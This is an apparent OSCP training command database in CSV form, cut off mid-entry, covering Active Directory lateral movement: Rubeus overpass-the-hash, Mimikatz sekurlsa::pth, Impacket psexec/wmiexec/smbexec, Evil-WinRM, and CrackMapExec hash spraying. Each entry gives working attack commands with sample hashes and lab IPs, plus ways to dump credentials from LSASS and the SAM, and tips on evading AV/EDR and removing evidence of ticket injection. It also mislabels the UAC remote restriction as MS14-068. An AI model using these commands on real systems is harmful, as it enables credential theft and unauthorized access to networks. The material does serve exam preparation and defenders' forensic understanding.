"overpass-rubeus-asktgt","Overpass-the-Hash - Rubeus asktgt","active-directory","Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt","Request TGT using NTLM hash with Rubeus (alternative to Mimikatz sekurlsa::pth)","lateral-movement","Rubeus.exe asktgt /user:jen /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt","EDUCATIONAL CONTEXT:
Rubeus directly requests TGT using hash (cleaner than Mimikatz method).

WHY USE THIS:
Single command vs Mimikatz multi-step.

TIME ESTIMATE:
<1 minute.

EXAM TIP:
Rubeus asktgt more reliable than Mimikatz sekurlsa::pth.","high","","","","{""PREAUTH_FAILED"": ""Invalid hash"", ""CLIENT_NOT_FOUND"": ""Username/domain incorrect""}","{""asktgt"": ""Request TGT from KDC"", ""/user"": ""Username"", ""/domain"": ""Domain FQDN"", ""/rc4"": ""NTLM hash (RC4 encryption)"", ""/ptt"": ""Pass-the-ticket - auto inject TGT"", ""/aes256"": ""Use AES256 hash instead (if available)""}","","[""overpass-mimikatz-pth""]",""
"kerberos-purge-tickets","Kerberos - Purge All Tickets","active-directory","klist purge","Clear all cached Kerberos tickets from current session","lateral-movement","","EDUCATIONAL CONTEXT:
Clean up ticket cache for OPSEC or testing.

WHY USE:
Remove evidence of ticket injection, prepare clean state.

TIME ESTIMATE:
<5 seconds.

EXAM TIP:
Use between testing different stolen tickets.","medium","","","","{""Access denied"": ""Run as administrator or purge only affects current user tickets""}","{""purge"": ""Delete all Kerberos tickets from cache""}","","",""
"kerberos-troubleshoot-time","Kerberos - Troubleshoot Time Skew","active-directory","net time \\<DC>","Check time synchronization between client and DC (Kerberos requires <5 min skew)","lateral-movement","net time \\DC1","EDUCATIONAL CONTEXT:
Kerberos requires client and DC time within 5 minutes (default).

WHY IMPORTANT:
Time skew causes KDC_ERR_SKEW error, all Kerberos auth fails.

COMMON ISSUE:
VMs with suspended state, isolated networks without NTP.

FIX:
net time \\<DC> /set /yes synchronizes to DC time.

TIME ESTIMATE:
<10 seconds check, <30 seconds fix.

EXAM TIP:
If Kerberos mysteriously fails, check time first - common troubleshooting step.","medium","","","","{""Access denied"": ""Use /set /yes to force: net time \\\\<DC> /set /yes"", "">5 min skew"": ""Kerberos will fail - synchronize time before retry"", ""Cannot contact DC"": ""Check network connectivity and firewall""}","{""net time"": ""Display or synchronize time"", ""\\\\<DC>"": ""Query time from DC"", ""/set /yes"": ""Synchronize local time to DC""}","","",""
"pth-mimikatz-sekurlsa","Pass-the-Hash - Mimikatz sekurlsa::pth","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell","Launch process with user's NTLM hash using Mimikatz from compromised Windows host","lateral-movement","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH MIMIKATZ:
WHAT IS PASS-THE-HASH:
Lateral movement technique that exploits how NTLM authentication works.

Instead of cracking password, use the NTLM hash directly for authentication.

The vulnerability isn't in NTLM protocol itself (which legitimately accepts hashes), but in unauthorized access to password hashes.

THREE PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user

2.

SMB connection to target (port 445 accessible)

3.

User must have local administrator privileges on target

HOW NTLM AUTHENTICATION WORKS:
NTLM uses challenge-response mechanism:
1.

Client requests authentication

2.

Server sends challenge (random number)

3.

Client encrypts challenge with NTLM hash (NOT password)

4.

Server verifies encrypted challenge

Because authentication uses hash directly, possessing the hash = possessing the password.

MIMIKATZ SEKURLSA::PTH TECHNIQUE:
Mimikatz injects NTLM hash into LSASS process memory, creating new logon session:
  mimikatz # privilege::debug
  mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

This spawns new PowerShell process with jen's credentials injected.

WHOAMI BEHAVIOR (CRITICAL UNDERSTANDING):
When you run whoami in the new PowerShell, it shows ORIGINAL user (e.g., jeff), NOT impersonated user (jen).

This is EXPECTED behavior because:
- whoami checks current process token (shows jeff)
- Network authentication uses injected credentials (uses jen)
- Verify with:
dir \\files04\c$ (should succeed as jen)

2014 UAC REMOTE RESTRICTIONS (MS14-068):
- RID 500 Administrator:
PTH works normally
- Other local admin accounts:
PTH BLOCKED by UAC filtering
- Domain users with local admin rights:
PTH works (bypass UAC restrictions)

This is why training uses domain user 'jen' with local admin rights.

BEHIND THE SCENES:
1.

privilege::debug enables SeDebugPrivilege (required for LSASS access)

2.

Creates new logon session (LUID)

3.

Injects NTLM hash into new session's credential structure

4.

Spawns process (/run:powershell) in context of new session

5.

Process inherits authentication token containing hash

OBTAINING HASHES:
- Mimikatz:
sekurlsa::logonpasswords (from memory)
- Mimikatz:
lsadump::sam (from SAM database)
- secretsdump.py (remote or local SAM/LSA dump)
- CrackMapExec:
--sam, --lsa flags

MANUAL VERIFICATION:
From new PowerShell window, test network authentication:
  net use \\files04\c$  # Should succeed without password prompt
  dir \\files04\c$      # Should list contents

COMPARISON TO IMPACKET TOOLS:
- Mimikatz PTH:
  Runs ON compromised Windows host, creates local process

- Impacket PTH:
  Runs FROM Kali, connects remotely to Windows target

- Use Mimikatz when you have RDP/shell on Windows box
- Use Impacket when attacking remotely from Kali

Time:
2-3 minutes (hash dump + verification + execution)

EXAM STRATEGY:
1.

Always verify hash with crackmapexec BEFORE attempting exploitation

2.

Test with simple command (dir \\target\c$) before complex payloads

3.

Remember whoami behavior - don't panic when it shows wrong user

4.

Prefer domain users over local admins (bypass UAC restrictions)

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 9 (NewCredentials) when using /run
- Event ID 4648:
Explicit credential logon attempt
- Mimikatz execution leaves traces in memory and logs","high","","","","{""privilege::debug FAILED"": ""Run mimikatz as Administrator"", ""NTLM seems invalid"": ""Verify hash format: 32 hex characters only, no colons or spaces"", ""Process created but no access"": ""Hash may be invalid. Verify with: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>"", ""whoami shows wrong user"": ""Expected behavior - token shows original user, but network auth uses <USER>""}","{""/user"": ""Target username to impersonate"", ""/domain"": ""Domain name"", ""/ntlm"": ""NTLM hash (32 hex characters, no LM hash needed)"", ""/run"": ""Program to spawn with new context (powershell, cmd, etc.)"", ""privilege::debug"": ""Enable SeDebugPrivilege required for LSASS access""}","","[""pth-impacket-psexec"", ""pth-evil-winrm"", ""pth-cme-spray""]",""
"pth-impacket-psexec","Pass-the-Hash - Impacket PSExec","active-directory","impacket-psexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Authenticate to remote Windows using NTLM hash with impacket-psexec from Kali","lateral-movement","impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET PSEXEC:
WHAT IS PASS-THE-HASH:
Lateral movement technique leveraging NTLM authentication's acceptance of password hashes instead of plaintext passwords.

The vulnerability is unauthorized access to stored hashes, not a flaw in NTLM protocol itself.

FOUR PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user

2.

SMB connection available (port 445)

3.

File and Printer Sharing enabled on target (default on Windows Server)

4.

User must be member of local Administrators group on target

PROTOCOL MECHANICS:
NTLM authentication challenge-response protocol:
1.

Client requests authentication to server

2.

Server sends 8-byte random challenge

3.

Client encrypts challenge with NTLM hash (hash used directly, not password)

4.

Server verifies encrypted response

5.

Authentication succeeds if response matches expected value

Hash never crosses network in plaintext - encrypted challenge-response proves hash possession.

IMPACKET PSEXEC IMPLEMENTATION:
Impacket's psexec.py replicates Sysinternals PsExec behavior:
1.

Authenticates via SMB using NTLM hash (via -hashes flag)

2.

Uploads service executable to ADMIN$ share

3.

Creates Windows service via Service Control Manager (RPC)

4.

Service spawns cmd.exe and redirects I/O over named pipe

5.

Interactive shell established

HASH FORMAT (CRITICAL):
- Impacket uses:
  -hashes :NTLM_HASH (colon prefix, NTLM only)

- Example:
  -hashes :2892D26CDF84D7A70E2EB3B9F05C425E

- LM:NTLM format:
  -hashes LM_HASH:NTLM_HASH (only needed for ancient systems)

- Most modern Windows systems:
NTLM hash sufficient, LM disabled

2014 UAC REMOTE RESTRICTIONS (MS14-068 CRITICAL):
Microsoft patch blocks PTH for local administrator accounts EXCEPT RID 500:
- RID 500 Administrator (built-in):
PTH works normally
- Other local admin accounts:
PTH authentication BLOCKED by UAC filtering
- Domain users with local admin rights:
PTH works (bypass UAC restrictions)

Training scenario uses 'Administrator' account (RID 500) which bypasses restriction.

OBTAINING NTLM HASHES:
From Kali:
- secretsdump.py DOMAIN/USER:PASSWORD@TARGET (remote SAM/LSA dump)
- crackmapexec smb TARGET -u USER -p PASS --sam (local SAM)
- crackmapexec smb TARGET -u USER -p PASS --lsa (LSA secrets)

From Windows:
- Mimikatz:
sekurlsa::logonpasswords (from LSASS memory)
- Mimikatz:
lsadump::sam (from SAM registry hive)
- reg save HKLM\SAM sam.save (manual registry extraction)

HASH FORMAT IN DUMPS:
Secretsdump output:
  USERNAME:RID:LM_HASH:NTLM_HASH:::
Example:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
Use 4th field (NTLM_HASH after 3rd colon).

PORT REQUIREMENTS:
- TCP 445:
SMB (primary protocol for file access and authentication)
- TCP 139:
NetBIOS (legacy, usually not required on modern systems)
- Dynamic high ports:
For service creation via RPC

EXECUTION CONTEXT:
PsExec spawns shell as SYSTEM (not as authenticated user):
- Authentication happens as <USER> (with hash)
- Service runs as Local System account
- Full privileges on target machine
- whoami shows 'nt authority\system'

COMPARISON TO OTHER TOOLS:
- PSExec:
  SYSTEM shell, service creation (noisy), uploads binary

- WMIExec:
  User-level shell, fileless, stealthier but slower

- SMBExec:
  Semi-interactive, fileless, creates/deletes batch files

- Evil-WinRM:
  Interactive PowerShell, best for post-exploitation

VERIFICATION BEFORE EXPLOITATION:
Always test hash validity first (saves exam time):
  crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E

Look for '[+] DOMAIN\Administrator:HASH (Pwn3d!)' - indicates admin access.

Time:
1-2 minutes for connection establishment and shell spawn

EXAM STRATEGY:
1.

Obtain hashes via secretsdump or Mimikatz

2.

Verify hash with crackmapexec BEFORE attempting psexec

3.

If authentication fails, verify user is RID 500 or domain user

4.

If psexec fails but hash valid, try wmiexec or smbexec

5.

Once shell obtained, immediately dump more credentials for lateral movement

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
  Hash invalid, username wrong, or account disabled

- STATUS_ACCESS_DENIED:
  User not local admin (test with crackmapexec)

- UAC restriction:
  Local admin blocked (switch to domain user or RID 500)

- Connection timeout:
  Firewall blocking port 445

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via NTLM)
- Event ID 4672:
Special privileges assigned to new logon (admin)
- Event ID 7045:
Service installed (PSEXESVC)
- Event ID 5140:
Network share accessed (ADMIN$)
- Service creation logs:
PSEXESVC.exe in System event logs","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid hash or username. Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>"", ""STATUS_ACCESS_DENIED"": ""User not local admin. Test: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>"", ""UAC restriction"": ""Built-in local admin accounts blocked by UAC (except RID 500 Administrator)"", ""Connection timeout"": ""Firewall blocking SMB: sudo nmap -p 445 -Pn -v <TARGET>""}","{""-hashes :NTLM"": ""Pass NTLM hash (colon prefix, no LM hash needed)"", ""-hashes LM:NTLM"": ""Pass both LM and NTLM (rarely needed)"", ""-target-ip"": ""Specify IP if hostname resolution fails"", ""-no-pass"": ""Don't prompt for password (hash auth only)""}","","[""pth-impacket-wmiexec"", ""pth-impacket-smbexec"", ""pth-evil-winrm""]",""
"pth-impacket-wmiexec","Pass-the-Hash - Impacket WMIExec","active-directory","impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Semi-interactive shell via WMI using NTLM hash from Kali","lateral-movement","impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET WMIEXEC:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
From Kali, performing pass-the-hash to FILES04 (192.168.50.73):
```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

Output showed successful lateral movement:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>
```

Commands executed successfully:
- hostname returned:
FILES04
- whoami returned:
files04\administrator

This demonstrated successful pass-the-hash lateral movement from Kali to Windows target using only NTLM hash.

WHAT IS PASS-THE-HASH VIA WMI:
Fileless lateral movement technique using Windows Management Instrumentation for remote process creation, authenticated with NTLM hash instead of password.

THREE PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user
2.

SMB (port 445) and RPC (port 135) accessible on target
3.

User must have local administrator privileges

WHY USE WMIEXEC OVER PSEXEC:
- NO service creation (PSExec creates PSEXESVC service - Event ID 7045)
- NO binary written to disk (PSExec uploads executable to ADMIN$)
- Fileless execution = stealthier, better for AV/EDR evasion
- Leaves fewer forensic artifacts

TRADEOFF:
WMIExec is SLOWER than PSExec because:
- Each command spawns new process via Win32_Process.Create
- Output retrieved via temporary SMB share (not persistent named pipe)
- No persistent shell process (semi-interactive only)

HOW WMIEXEC WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB using NTLM hash (-hashes :HASH)
2.

Connects to WMI service over RPC (port 135)
3.

For each command:
Calls Win32_Process.Create method
4.

Process executes with redirected output to ADMIN$ share temporary file
5.

Impacket retrieves output file via SMB
6.

Deletes temporary file
7.

Returns output to attacker

PROCESS CREATION METHOD:
WMI Win32_Process.Create:
```
PROCESS CALL ID:
1
C:\> cmd.exe /Q /c <COMMAND> 1> \\127.0.0.1\ADMIN$\__<TIMESTAMP> 2>&1
```
Output redirected to ADMIN$ share for retrieval.

PORT REQUIREMENTS:
- TCP 135:
RPC endpoint mapper (initial WMI connection)
- TCP 445:
SMB (authentication and output retrieval via ADMIN$)
- Ephemeral ports 49152-65535:
RPC session data (Windows Server 2008+)

HASH FORMAT:
- Impacket WMIExec:
-hashes :NTLM_HASH (colon prefix, NTLM only)
- Example:
-hashes :2892D26CDF84D7A70E2EB3B9F05C425E
- No LM hash needed for modern systems

EXECUTION CONTEXT:
WMIExec spawns processes as authenticated user (NOT SYSTEM like PSExec):
- Authentication:
Administrator (with NTLM hash)
- Process owner:
Administrator (not NT AUTHORITY\SYSTEM)
- whoami returns:
files04\administrator
- Privileges:
Admin rights via authenticated user context

2014 UAC REMOTE RESTRICTIONS (MS14-068):
- RID 500 Administrator:
PTH works (training uses this)
- Other local admins:
PTH blocked by UAC filtering
- Domain users with local admin:
PTH works (bypass UAC)

TRAINING CONTEXT:
Scenario involved:
- Attacker on Kali Linux
- Administrator NTLM hash obtained via previous compromise
- Target:
FILES04 (192.168.50.73) - Windows Server
- Goal:
Lateral movement without alerting security tools

COMPARISON TO OTHER IMPACKET TOOLS:
- PSExec:
SYSTEM shell, service creation (noisy), faster, uploads binary
- WMIExec:
User shell, fileless, stealthier, slower, no service
- SMBExec:
User shell, fileless, batch files, slower
- SecretsDump:
Credential extraction only (no shell)

VERIFICATION BEFORE EXPLOITATION:
Test hash validity first:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for:
[+] DOMAIN\Administrator:HASH (Pwn3d!)

SEMI-INTERACTIVE SHELL BEHAVIOR:
- Not a true interactive shell (like SSH/RDP)
- Each command executed independently
- No persistent environment variables between commands
- No tab completion or command history
- Cannot run interactive programs (no stdin piping)

MANUAL ALTERNATIVE:
From PowerShell on compromised Windows host:
```powershell
$username = 'Administrator'
$password = 'Password123!' # In reality, would use hash
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""calc"" -ComputerName 192.168.50.73 -Credential $credential
```
(Note:
PowerShell doesn't natively support hash-based auth - requires Mimikatz injection)

TIME ESTIMATE:
- Connection:
30 seconds
- Per command:
2-5 seconds (slower than PSExec)
- Total for basic enumeration:
2-3 minutes

EXAM STRATEGY:
1.

Use WMIExec when stealth is priority (AV/EDR present)
2.

Use PSExec when speed is priority (stable environments)
3.

Always verify hash with crackmapexec first
4.

If WMI fails, try PSExec or SMBExec with same hash
5.

For complex tasks, consider upgrading to reverse shell

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
Invalid hash or username
- RPC unavailable:
Port 135 blocked by firewall
- ACCESS_DENIED:
User not local admin
- Slow execution:
Expected - each command spawns new process

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via NTLM)
- Event ID 4672:
Special privileges assigned (admin logon)
- WMI Event ID 5857-5861:
WMI activity logs
- No service creation events (unlike PSExec)
- Process creation:
Event ID 4688 for spawned processes
- ADMIN$ access:
Event ID 5140 (network share access)","high","","","","{""STATUS_LOGON_FAILURE"": ""Verify hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>"", ""RPC unavailable"": ""Check port 135: sudo nmap -p 135 -Pn -v <TARGET>"", ""Slower than PSExec"": ""Expected - WMI creates temp share per command for output retrieval""}","{""-hashes :NTLM"": ""NTLM hash for authentication"", ""-shell-type powershell"": ""Use PowerShell instead of cmd.exe"", ""-codec utf-8"": ""Set character encoding""}","","[""pth-impacket-psexec"", ""pth-impacket-smbexec""]",""
"pth-impacket-smbexec","Pass-the-Hash - Impacket SMBExec","active-directory","impacket-smbexec -hashes :<NTLM_HASH> <USER>@<TARGET>","Fileless shell via SMB using NTLM hash from Kali","lateral-movement","impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH IMPACKET SMBEXEC:
WHAT IS SMBEXEC:
Fileless lateral movement tool providing semi-interactive shell via SMB, using NTLM hash for authentication.

Alternative to PSExec that doesn't persistently write binaries to disk.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user  
2.

SMB access (port 445) to target
3.

User must be local administrator on target
4.

ADMIN$ share must be accessible

WHY USE SMBEXEC:
- FILELESS execution (no persistent binary like PSExec)
- More stealthy than PSExec (no service creation)
- Good alternative when PSExec detected/blocked
- Cleaner than WMIExec for command execution

HOW SMBEXEC WORKS (TECHNICAL BREAKDOWN):
1.

Authenticates to target via SMB using NTLM hash
2.

For each command:
   a.

Creates temporary batch file (.bat) in ADMIN$ share
   b.

Creates Windows service to execute batch file
   c.

Batch file runs command and redirects output to ADMIN$
   d.

SMBExec retrieves output via SMB
   e.

Deletes batch file and service
3.

Result:
Semi-interactive shell without persistent artifacts

BATCH FILE CREATION:
Example batch file created per command:
```batch
@echo off
cmd.exe /Q /c <COMMAND> 1> \\127.0.0.1\ADMIN$\__output 2>&1
```
File written to:
\\TARGET\ADMIN$\execute.bat

SERVICE CREATION:
Temporary service created via Service Control Manager:
- Service name:
Random (e.g., BTOBTO)
- Binary path:
cmd.exe /c \\127.0.0.1\ADMIN$\execute.bat
- Started immediately
- Deleted after execution

COMPARISON TO OTHER TOOLS:
- PSExec:
Persistent service (PSEXESVC), binary uploaded, SYSTEM shell, faster
- SMBExec:
Temporary service, batch files only, user shell, stealthier
- WMIExec:
No service, pure WMI, fileless, slower
- Evil-WinRM:
WinRM protocol, interactive PowerShell, different ports

FILELESS ADVANTAGE:
No persistent executable written to disk:
- PSExec uploads psexesvc.exe (detectable by AV)
- SMBExec uses native cmd.exe (already on system)
- Only temporary .bat files (deleted after execution)
- Harder for forensics to detect

HASH FORMAT:
- Impacket:
-hashes :NTLM_HASH (colon prefix)
- Example:
-hashes :2892D26CDF84D7A70E2EB3B9F05C425E
- No LM hash needed for modern systems

EXECUTION CONTEXT:
SMBExec spawns processes as authenticated user:
- Authentication:
Specified user (with NTLM hash)
- Process owner:
Same user (not SYSTEM)
- whoami returns:
domain\username or computername\username
- Service runs in user context

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
PTH works
- Other local admins:
PTH blocked by UAC
- Domain users with local admin:
PTH works

PORT REQUIREMENTS:
- TCP 445:
SMB (authentication and file operations)
- TCP 139:
NetBIOS (legacy, usually not required)
- Dynamic ports:
Service Control Manager (RPC)

SEMI-INTERACTIVE BEHAVIOR:
- Each command executed independently
- No persistent shell process
- No environment variable persistence
- Slower than PSExec (batch file creation overhead)

MODE OPTIONS:
- SHARE mode (default):
Uses ADMIN$ share for batch files
- SERVER mode:
Creates temporary SMB server for output retrieval

VERIFICATION:
Test hash before exploitation:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Look for:
(Pwn3d!)

TIME ESTIMATE:
- Connection:
30-60 seconds
- Per command:
2-4 seconds (batch creation + execution + cleanup)
- Total for enumeration:
2-4 minutes

EXAM STRATEGY:
1.

Use SMBExec when stealth is priority
2.

Use PSExec when speed is priority
3.

Use WMIExec when service creation must be avoided
4.

Try all three if one fails - same hash, different method

COMMON FAILURES:
- STATUS_LOGON_FAILURE:
Invalid hash or username
- STATUS_OBJECT_NAME_NOT_FOUND:
ADMIN$ not accessible
- ACCESS_DENIED:
User not local admin
- Slower execution:
Expected - overhead of batch file operations

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon)
- Event ID 7045:
Service installed (temporary service)
- Event ID 4688:
Process creation (cmd.exe executing batch)
- Event ID 5140:
ADMIN$ share accessed
- Batch file traces in ADMIN$ (if not cleaned up properly)
- Service creation/deletion logs in System event log","high","","","","{""STATUS_OBJECT_NAME_NOT_FOUND"": ""ADMIN$ share not accessible"", ""Slower execution"": ""Expected - creates/deletes batch file per command""}","{""-hashes :NTLM"": ""NTLM hash for authentication"", ""-mode SHARE"": ""Use ADMIN$ share (default)"", ""-mode SERVER"": ""Create temp SMB server for output""}","","[""pth-impacket-psexec"", ""pth-impacket-wmiexec""]",""
"pth-evil-winrm","Pass-the-Hash - Evil-WinRM","active-directory","evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>","Interactive PowerShell remoting via WinRM using NTLM hash from Kali","lateral-movement","evil-winrm -i 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH EVIL-WINRM:
WHAT IS EVIL-WINRM:
Ruby-based WinRM client supporting pass-the-hash authentication for interactive PowerShell remoting from Kali.

Provides rich post-exploitation features including file upload/download and in-memory script execution.

THREE PREREQUISITES:
1.

Valid NTLM hash from compromised user
2.

WinRM enabled on target (port 5985 HTTP or 5986 HTTPS)
3.

User must be member of Remote Management Users OR Administrators group

WINRM GROUP MEMBERSHIP REQUIREMENT:
From OSCP training, for WinRM authentication to work:
- User must be part of 'Administrators' group, OR
- User must be part of 'Remote Management Users' group on target host

This is WinRM-specific requirement (different from PSExec/WMI which only need Administrators).

WHY USE EVIL-WINRM:
- Interactive PowerShell shell (better than semi-interactive Impacket tools)
- Built-in file transfer:
upload/download commands
- In-memory script execution:
No disk writes for scripts
- Menu system for common tasks
- PowerShell script loading:
Invoke-Mimikatz, PowerView, etc.
- User-friendly interface with tab completion

PROTOCOL:
WS-MANAGEMENT (WinRM):
- Port 5985:
HTTP (unencrypted)
- Port 5986:
HTTPS (encrypted with SSL/TLS)
- Microsoft's implementation of WS-Management open standard
- Designed for legitimate remote administration

HASH FORMAT (CRITICAL DIFFERENCE):
Evil-WinRM uses DIFFERENT format than Impacket:
- Evil-WinRM:
-H NTLM_HASH (no colon prefix)
- Impacket:
-hashes :NTLM_HASH (colon prefix)

Examples:
```bash
# Evil-WinRM (NO colon)
evil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E

# Impacket (colon prefix)
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

WINRM AUTHENTICATION:
WinRM supports multiple authentication methods:
- Basic:
Username + password (plaintext over HTTPS)
- NTLM:
Challenge-response with hash (Evil-WinRM uses this for PTH)
- Kerberos:
Ticket-based (requires hostname, not IP)
- CredSSP:
Credential delegation

For Pass-the-Hash, Evil-WinRM uses NTLM authentication where hash is used directly in challenge-response protocol.

INTERACTIVE POWERSHELL SHELL:
Evil-WinRM provides full interactive PowerShell:
- Persistent environment variables
- Tab completion
- Command history
- Multi-line commands
- PowerShell modules available
- Runs in user context (not SYSTEM)

EXECUTION CONTEXT:
- Authentication:
Specified user (with NTLM hash)
- Process owner:
Same user
- whoami returns:
domain\username or computername\username
- PowerShell version:
Target's installed version (5.1 typically)

BUILT-IN FEATURES:
File transfer:
```
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\file.exe
*Evil-WinRM* PS> download C:\Users\admin\Desktop\flag.txt /home/kali/flag.txt
```

Script loading (in-memory):
```
*Evil-WinRM* PS> Invoke-Binary /path/to/Invoke-Mimikatz.ps1
*Evil-WinRM* PS> Invoke-Mimikatz
```

Menu system:
```
*Evil-WinRM* PS> menu
```
Provides shortcuts for common tasks.

2014 UAC REMOTE RESTRICTIONS:
- RID 500 Administrator:
PTH works
- Other local admins:
PTH blocked by UAC (unless Remote Management Users)
- Domain users with proper group membership:
PTH works

COMPARISON TO OTHER TOOLS:
- PSExec:
SYSTEM shell, service creation, faster but noisier
- WMIExec:
Semi-interactive, fileless, slower
- SMBExec:
Semi-interactive, batch files, stealthy
- Evil-WinRM:
Interactive PowerShell, best UX, WinRM-specific

WinRM advantage:
Different protocol (not SMB) - may work when SMB blocked.

VERIFICATION:
Test WinRM availability and hash:
```bash
# Check WinRM ports
nmap -p 5985,5986 -Pn -v 192.168.50.73

# Test hash
crackmapexec winrm 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

SSL/TLS SUPPORT:
For HTTPS (port 5986):
```bash
evil-winrm -i 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E -S
```
-S flag enables SSL (port 5986).

Note:
Self-signed certificates common - Evil-WinRM accepts by default.

OBTAINING HASHES:
- secretsdump.py:
Remote SAM/LSA dump from Kali
- Mimikatz:
sekurlsa::logonpasswords on Windows
- crackmapexec:
--sam or --lsa flags

TIME ESTIMATE:
- Connection:
30-60 seconds
- Interactive session:
As long as needed
- File transfers:
Depends on size (typically fast)

EXAM STRATEGY:
1.

Use Evil-WinRM for interactive post-exploitation when WinRM available
2.

Preferred over PSExec for user-friendly PowerShell environment
3.

Excellent for running PowerShell enumeration scripts (PowerUp, PowerView)
4.

Built-in upload/download saves time vs manual file transfer
5.

If connection fails, verify WinRM ports open and user in correct group

COMMON FAILURES:
- Authorization error:
User not in Administrators or Remote Management Users
- Network unreachable:
WinRM not enabled or firewall blocking ports
- Hash format error:
Remove colon prefix (use -H NTLM not -H :NTLM)
- SSL error:
Certificate issue - try without -S (use HTTP port 5985)

MANUAL ALTERNATIVE:
From compromised Windows host with PowerShell:
```powershell
$username = 'Administrator'
$password = 'Password123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force  
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession $session
```
(Note:
PowerShell doesn't natively support hash-based auth - requires Mimikatz for PTH)

FORENSIC ARTIFACTS:
- Event ID 4624:
Logon Type 3 (Network logon via WinRM)
- Event ID 4672:
Special privileges assigned
- WinRM logs:
Event IDs 6-169 (WinRM activity)
- PowerShell logging:
Event ID 4104 (script block logging if enabled)
- Event ID 5156:
Windows Filtering Platform connections (port 5985/5986)","high","","","","{""Authorization error"": ""Verify hash: crackmapexec winrm <TARGET> -u <USER> -H <NTLM_HASH>"", ""Network unreachable"": ""Check WinRM port: nmap -p 5985,5986 -Pn -v <TARGET>"", ""Hash format error"": ""Use 32 hex characters, no colons: -H NTLM not -H :NTLM"", ""SSL error"": ""Try without SSL: remove -S flag""}","{""-i"": ""Target IP"", ""-u"": ""Username"", ""-H"": ""NTLM hash (uppercase H, no colon prefix)"", ""-S"": ""Use SSL (HTTPS port 5986)""}","","[""pth-impacket-psexec"", ""pth-impacket-wmiexec""]",""
"pth-cme-spray","Pass-the-Hash - CrackMapExec Spray","active-directory","crackmapexec smb <TARGET_RANGE> -u <USER> -H <NTLM_HASH>","Spray NTLM hash across multiple targets to find where it works","lateral-movement","crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E","OSCP TRAINING MATERIAL - PASS-THE-HASH SPRAYING WITH CRACKMAPEXEC:
WHAT IS PTH SPRAYING:
Rapidly testing a single NTLM hash across multiple targets to identify all systems where the compromised credential grants administrative access.

Efficient technique for discovering credential reuse.

WHY SPRAY HASHES:
- Same local administrator password often reused across multiple machines
- Domain admin hash works on all domain-joined systems
- Quick way to identify lateral movement opportunities
- Faster than testing each system individually

CRACKMAPEXEC (CME) ADVANTAGES:
- Multi-threaded:
Tests many hosts simultaneously
- CIDR support:
192.168.50.0/24 tests entire subnet
- Clear indicators:
[+] Pwn3d! shows admin access
- Protocol flexibility:
SMB, WinRM, MSSQL, SSH
- Built-in post-exploitation:
--sam, --lsa, -x, -X

PWNED INDICATOR:
```
